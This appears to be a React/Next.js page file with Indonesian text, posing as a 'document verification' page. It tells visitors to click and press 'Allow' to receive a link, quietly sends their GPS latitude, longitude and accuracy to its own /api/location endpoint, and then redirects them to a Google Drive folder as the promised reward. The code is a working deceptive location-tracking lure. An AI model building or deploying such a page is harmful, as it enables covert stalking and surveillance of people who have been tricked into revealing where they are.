// pages/index.tsx
import { useState } from 'react';

export default function Home() {
  const [loading, setLoading] = useState(false);

  const startTracking = () => {
    if (navigator.geolocation) {
      setLoading(true);
      navigator.geolocation.getCurrentPosition(sendData, () => {
        alert("Gagal mendapatkan lokasi.");
        setLoading(false);
      });
    } else {
      alert("Browser Anda tidak mendukung GPS.");
    }
  };

  const sendData = (position: GeolocationPosition) => {
    fetch('/api/location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        acc: position.coords.accuracy
      })
    }).then(() => {
      window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
    }).catch((err) => {
      console.error("Gagal kirim data:", err);
      setLoading(false);
    });
  };

  return (
    <div style={{ textAlign: 'center', marginTop: 100, fontFamily: 'sans-serif' }}>
      <h2>Verifikasi Dokumen</h2>
      <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
      <p>Klik Allow untuk mendapatkan Link</p>
      <button
        onClick={startTracking}
        style={{
          padding: '12px 24px',
          fontSize: '16px',
          background: '#3c78da',
          color: 'white',
          border: 'none',
          borderRadius: '6px',
        }}
      >
        {loading ? 'Memuat...' : 'Dapatkan Link'}
      </button>
    </div>
  );
}
